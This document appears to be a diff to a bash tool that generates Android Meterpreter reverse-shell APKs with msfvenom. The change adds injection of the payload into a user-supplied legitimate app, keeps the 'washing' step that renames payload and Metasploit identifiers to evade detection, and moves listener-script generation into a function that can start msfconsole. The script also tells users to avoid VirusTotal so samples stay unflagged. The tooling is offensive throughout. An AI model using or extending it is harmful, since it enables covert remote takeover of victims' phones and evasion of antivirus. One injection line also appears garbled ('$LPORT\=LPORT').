@@ -15,9 +15,25 @@ LHOST=$(ifconfig eth0 | grep 'inet' | cut -d: -f2 | awk '{print $2}')
 LPORT="443"
 VERBOSE=0
 DEBUG=0
-inFile=""   #will be used for msfvenom -x injection in next update
+inFile=""
 outFile="AndroidService.apk"
 willRun=0   
+
+### Variables used for the washing process ###
+fullPath=$outFile
+APK=$(basename $fullPath)
+VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
+VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
+VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
+VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
+VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
+VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
+VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
+VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
+JAR=$(which apktool.jar)
+apkName=$(echo $APK | cut -f 1 -d '.')
+localAddresses=$(ifconfig | grep 'inet' | cut -d: -f2 | awk '{print $2}')
+localAddArray=($localAddresses)
 
 ### Basic user input checks ###
 if [[ $# -eq 0 ]] ; then
@@ -32,6 +48,51 @@ redirect() {
     else
         "$@"
     fi
+}
+
+### Method for generating the listener script ###
+createListener() {
+	echo -e "\033[34m [-] \x1B[0m Generating an msf listener script"
+	echo "use multi/handler" > /tmp/$apkName.listener
+	echo "set payload $PAYLOAD" >> /tmp/$apkName.listener
+	isLocal=$(ifconfig | grep -cs $LHOST)
+	if [[ $isLocal != 1 ]]
+	then
+	    echo -e "\033[36m [-] \x1B[0m Unable to find the LHOST address on the local machine."
+	    localAddArray+=($LHOST)
+	    for ((i = 0; i < ${#localAddArray[@]}; ++i)); do
+		position=$(( $i ))
+		echo -e " \t[$position]  ${localAddArray[$i]}"
+	    done
+	    read -r -p " [-]  Which address do you wish to place in the listener script? " userSelectedAdd
+	    if [ $userSelectedAdd -eq $userSelectedAdd 2>/dev/null ] && [ $userSelectedAdd -lt ${#localAddArray[@]} ] && [ $userSelectedAdd -ge 0 ]
+	    then
+		    echo -e "\033[32m [-] \x1B[0m Inserting LHOST=${localAddArray[$userSelectedAdd]} into the listener script."
+		    LHOST=${localAddArray[$userSelectedAdd]}
+	    else
+		echo -e "\033[31m [!] \x1B[0m Invalid entry. Will continue the script with LHOST=$LHOST"
+	    fi
+	fi
+	read -r -p " [-]  Add an AutoRunScript? [y/N] " response
+	case "$response" in
+	    [yY][eE][sS]|[yY]) 
+		read -r -p "  >  " autoRunThis
+		echo "set AutoRunScript $autoRunThis" >> /tmp/$apkName.listener
+		;;
+	esac
+	echo "set LHOST $LHOST" >> /tmp/$apkName.listener
+	echo "set LPORT $LPORT" >> /tmp/$apkName.listener
+	echo "set ExitOnSession false" >> /tmp/$apkName.listener
+	echo "exploit -j" >> /tmp/$apkName.listener
+	echo -e "\033[32m [-] \x1B[0m Listener script has been generated: /tmp/$apkName.listener"
+	echo -e "\033[34m [-] \x1B[0m Start listener with: msfconsole -r /tmp/$apkName.listener"
+
+	read -r -p " [-]  Launch listener now? [y/N] " response
+	case "$response" in
+	    [yY][eE][sS]|[yY]) 
+		msfconsole -r /tmp/$apkName.listener 
+		;;
+	esac
 }
 
 ### Setting up the input arguments and help information ###
@@ -134,7 +195,6 @@ do
 	fi
 done
 
-
 if [ $willRun -eq 0 ]; then
   exit 1
 fi
@@ -148,9 +208,28 @@ if [ -z $inFile ]; then
 	echo -e "\033[34m [-] \x1B[0m msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o $outFile"
 	redirect msfvenom -p $PAYLOAD LHOST\=$LHOST LPORT\=$LPORT -o $outFile
 else 
-	#echo -e "\033[34m [-] \x1B[0m msfvenom -x $inFile -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o $outFile"
-	#redirect msfvenom -p $PAYLOAD LHOST\=$LHOST $LPORT\=LPORT -x $inFile -o $outFile
-	echo -e "\033[31m [!] \x1B[0m Sorry, but the injection method hasn't been implemented yet. Coming soon!"
+	# As MSFVenom's '-x' option appears to already handle most of the things handled here
+	# we will simply pass your information over to let it handle the injection.
+	# In the future if things change, then we can continue working with the output.
+	echo -e "\033[34m [-] \x1B[0m msfvenom -x $inFile -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT"
+	echo -e "\033[34m [-] \x1B[0m This may take some time. To see the output from MSFVenom run the script with --verbose."
+	redirect msfvenom -p $PAYLOAD LHOST\=$LHOST $LPORT\=LPORT -x $inFile -o injected_$inFile
+	
+	# MSFVenom -x is prone to fail due to many reasons (dependencies, unable to inject).
+	# Checking to make sure there was a payload generated.
+	if [ ! -f injected_$inFile ]; then
+	    echo -e "\033[31m [!] \x1B[0m MSFVenom payload generation failed. Run with verbose for more information on the MSFVenom output."
+	else
+	    echo -e "\033[32m [-] \x1B[0m MSFVenom payload generated: injected_$inFile"
+	fi
+
+	# Mainly just for renaming the listener file as this wasn't well thought out beforehand lol.. 
+	apkName=$(basename $inFile)
+
+	# Quick fix for added the injection was to make the listener script piece a method
+	createListener
+
+	# Not doing anything else with msfvenom -x as it is pretty boss as is.
 	exit 1
 fi
 
@@ -171,23 +250,6 @@ type apktool.jar >/dev/null 2>&1 || {
     chmod +x apktool.jar
     mv apktool.jar /usr/local/bin/.
 }
-
-
-### Variables used for the washing process ###
-fullPath=$outFile
-APK=$(basename $fullPath)
-VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
-VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
-VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
-VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
-VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
-VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
-VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
-VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
-JAR=$(which apktool.jar)
-apkName=$(echo $APK | cut -f 1 -d '.')
-localAddresses=$(ifconfig | grep 'inet' | cut -d: -f2 | awk '{print $2}')
-localAddArray=($localAddresses)
 
 ### APKTool to pull apart the package ###
 redirect java -jar $JAR d -f -o /tmp/payload $fullPath
@@ -246,45 +308,9 @@ fi
 echo -e "\033[32m [-] \x1B[0m Finished generating the payload."
 echo -e "\033[33m [-] \x1B[0m Please do not upload the washed/injected files to VirusTotal.com"
 echo -e "\033[36m [-] \x1B[0m Use nodistribute.com, or manual scanning on a device."
-echo -e "\033[34m [-] \x1B[0m Generating an msf listener script: $apkName.listener"
 
-### Creating the listener script ###
-echo "use multi/handler" > /tmp/$apkName.listener
-echo "set payload $PAYLOAD" >> /tmp/$apkName.listener
-isLocal=$(ifconfig | grep -cs $LHOST)
-if [[ $isLocal != 1 ]]
-then
-    echo -e "\033[36m [-] \x1B[0m Unable to find the LHOST address on the local machine."
-    localAddArray+=($LHOST)
-    for ((i = 0; i < ${#localAddArray[@]}; ++i)); do
-        position=$(( $i ))
-        echo -e " \t[$position]  ${localAddArray[$i]}"
-    done
-    read -r -p " [-]  Which address do you wish to place in the listener script? " userSelectedAdd
-    if [ $userSelectedAdd -eq $userSelectedAdd 2>/dev/null ] && [ $userSelectedAdd -lt ${#localAddArray[@]} ] && [ $userSelectedAdd -ge 0 ]
-    then
-	    echo -e "\033[32m [-] \x1B[0m Inserting LHOST=${localAddArray[$userSelectedAdd]} into the listener script."
-	    LHOST=${localAddArray[$userSelectedAdd]}
-    else
-        echo -e "\033[31m [!] \x1B[0m Invalid entry. Will continue the script with LHOST=$LHOST"
-    fi
-fi
-read -r -p " [-]  Add an AutoRunScript? [y/N] " response
-case "$response" in
-    [yY][eE][sS]|[yY]) 
-	read -r -p "  >  " autoRunThis
-	echo "set AutoRunScript $autoRunThis" >> /tmp/$apkName.listener
-        ;;
-esac
-echo "set LHOST $LHOST" >> /tmp/$apkName.listener
-echo "set LPORT $LPORT" >> /tmp/$apkName.listener
-echo "set ExitOnSession false" >> /tmp/$apkName.listener
-echo "exploit -j" >> /tmp/$apkName.listener
-echo -e "\033[32m [-] \x1B[0m Listener script has been generated: /tmp/$apkName.listener"
-echo -e "\033[34m [-] \x1B[0m Start listener with: msfconsole -r /tmp/$apkName.listener"
-read -r -p " [-]  Launch listener now? [y/N] " response
-case "$response" in
-    [yY][eE][sS]|[yY]) 
-        msfconsole -r /tmp/$apkName.listener 
-        ;;
-esac
+# Call the method to generate the listener.rc file
+createListener
+
+# Output the random smali file structure generated. Useful for those installing and launching with ADB
+echo -e "\033[34m [?] \x1B[0m Smali file structure: com.$VAR1.$VAR2"
